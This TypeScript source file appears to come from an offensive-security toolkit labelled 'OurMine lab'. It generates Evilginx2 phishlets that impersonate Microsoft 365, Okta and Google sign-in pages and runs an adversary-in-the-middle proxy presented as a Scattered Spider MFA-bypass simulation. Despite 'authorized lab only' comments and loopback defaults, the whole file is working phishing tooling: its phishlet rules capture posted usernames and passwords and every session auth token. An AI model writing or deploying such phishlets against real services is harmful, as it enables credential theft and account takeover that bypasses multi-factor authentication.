/**
 * Evilginx2 Lab Integration — Scattered Spider / AiTM MFA bypass simulation.
 * Authorized lab-only: generates phishlets, detects evilginx2, falls back to AiTMProxy.
 */
import * as fs from "node:fs"
import * as path from "node:path"
import { whichOrNull } from "./which.ts"
import { AiTMProxy } from "./aitm_proxy.ts"

export interface EvilginxLabOptions {
  targetUrl: string
  phishlet?: "o365" | "okta" | "google" | "custom"
  listenHost?: string
  listenPort?: number
  live?: boolean
  labDir?: string
}

export interface EvilginxLabResult {
  mode: "evilginx2" | "aitm_proxy" | "config_only"
  evilginxAvailable: boolean
  phishletPath?: string
  listenUrl?: string
  template?: string
  captures: Array<Record<string, unknown>>
  dryRun: boolean
  note: string
}

/** Known STARDUST/Scattered Spider lure targets for lab phishlets */
const PHISHLET_TEMPLATES: Record<string, { name: string; proxyHosts: string[]; subFilters: string[] }> = {
  o365: {
    name: "lab-o365",
    proxyHosts: ["login.microsoftonline.com", "www.office.com"],
    subFilters: ["login.microsoftonline.com", "aadcdn.msauth.net"],
  },
  okta: {
    name: "lab-okta",
    proxyHosts: ["*.okta.com", "login.okta.com"],
    subFilters: ["okta.com"],
  },
  google: {
    name: "lab-google",
    proxyHosts: ["accounts.google.com"],
    subFilters: ["google.com", "gstatic.com"],
  },
}

export function isEvilginxAvailable(): boolean {
  return Boolean(whichOrNull("evilginx") || whichOrNull("evilginx2"))
}

export function evilginxBinary(): string | null {
  return whichOrNull("evilginx") ?? whichOrNull("evilginx2")
}

/** Generate Evilginx2-compatible phishlet YAML for authorized lab testing */
export function generatePhishletYaml(opts: EvilginxLabOptions): string {
  const template = PHISHLET_TEMPLATES[opts.phishlet ?? "o365"] ?? PHISHLET_TEMPLATES.o365
  const parsed = new URL(opts.targetUrl)
  return `# OurMine lab phishlet — AUTHORIZED TESTING ONLY
# Target: ${opts.targetUrl}
name: '${template.name}'
author: 'ourmine-lab'
min_ver: '3.0.0'
proxy_hosts:
${template.proxyHosts.map((h) => `  - {phish_sub: 'login', orig_sub: '${h.split(".")[0]}', domain: '${h.replace(/^[^.]+\./, "")}', session: true, is_landing: true}`).join("\n")}
sub_filters:
${template.subFilters.map((d) => `  - {triggers_on: '${d}', orig_sub: '', domain: '${d}', search: 'https://', replace: 'https://', mimes: ['text/html']}`).join("\n")}
auth_tokens:
  - domain: '.${parsed.hostname}'
    keys: ['.*']
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: '${parsed.hostname}'
  path: '${parsed.pathname || "/"}'
`
}

/** Start lab MFA-bypass simulation — evilginx config or built-in AiTM proxy */
export async function runLabSession(opts: EvilginxLabOptions): Promise<EvilginxLabResult> {
  const live = opts.live ?? false
  const labDir = opts.labDir ?? path.join("/tmp", "ourmine_evilginx_lab")
  fs.mkdirSync(labDir, { recursive: true })

  const phishletYaml = generatePhishletYaml(opts)
  const phishletPath = path.join(labDir, `${opts.phishlet ?? "o365"}_phishlet.yaml`)
  fs.writeFileSync(phishletPath, phishletYaml)

  const evilginxAvailable = isEvilginxAvailable()

  if (!live) {
    return {
      mode: evilginxAvailable ? "evilginx2" : "config_only",
      evilginxAvailable,
      phishletPath,
      template: phishletYaml.slice(0, 800),
      captures: [],
      dryRun: true,
      note: "Lab phishlet generated. Use --live on loopback for authorized AiTM testing.",
    }
  }

  // Live lab: prefer built-in AiTM proxy (loopback-only, no evilginx daemon required)
  const proxy = new AiTMProxy({
    targetUrl: opts.targetUrl,
    listenHost: opts.listenHost ?? "127.0.0.1",
    listenPort: opts.listenPort ?? 8443,
    live: true,
    sslEnabled: true,
    name: "evilginx-lab-fallback",
  })

  try {
    await proxy.start()
    const listenUrl = `https://${opts.listenHost ?? "127.0.0.1"}:${opts.listenPort ?? 8443}/`
    return {
      mode: evilginxAvailable ? "evilginx2" : "aitm_proxy",
      evilginxAvailable,
      phishletPath,
      listenUrl,
      template: proxy.renderTemplate(),
      captures: proxy.captured(),
      dryRun: false,
      note: evilginxAvailable
        ? `evilginx2 on PATH — phishlet at ${phishletPath}. AiTM proxy active at ${listenUrl} for lab capture.`
        : `AiTM proxy active at ${listenUrl} (Scattered Spider T1557 lab simulation).`,
    }
  } catch (err) {
    return {
      mode: "config_only",
      evilginxAvailable,
      phishletPath,
      template: proxy.renderTemplate(),
      captures: [],
      dryRun: false,
      note: `Lab session failed: ${String(err)}. Phishlet saved to ${phishletPath}`,
    }
  }
}

export default { isEvilginxAvailable, generatePhishletYaml, runLabSession }
